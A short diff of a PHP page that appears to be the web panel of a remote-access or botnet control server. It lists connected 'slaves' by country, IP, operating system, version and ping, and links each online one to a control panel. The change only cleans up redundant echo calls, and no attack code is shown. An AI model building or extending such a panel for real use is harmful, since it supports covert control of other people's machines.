@@ -190,13 +190,13 @@ $(document).ready(function() {
 						$checked = $slave->isSelected() === "true" ? "checked" : "";
 						
 						echo "<tr>\n";
-						echo printTableData($slave->getStringId());
-						echo printTableData($slave->getDisplayCountry());
-						echo printTableData($slave->getIdentifier());
-						echo printTableData($slave->getIP());
-						echo printTableData($slave->getOperatingSystem());
-						echo printTableData($slave->getVersion());
-						echo printTableData($slave->getPing());
+						printTableData($slave->getStringId());
+						printTableData($slave->getDisplayCountry());
+						printTableData($slave->getIdentifier());
+						printTableData($slave->getIP());
+						printTableData($slave->getOperatingSystem());
+						printTableData($slave->getVersion());
+						printTableData($slave->getPing());
 
 						if (!$slave->isOffline()) {
 							echo printTableData("<a href='client.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");								
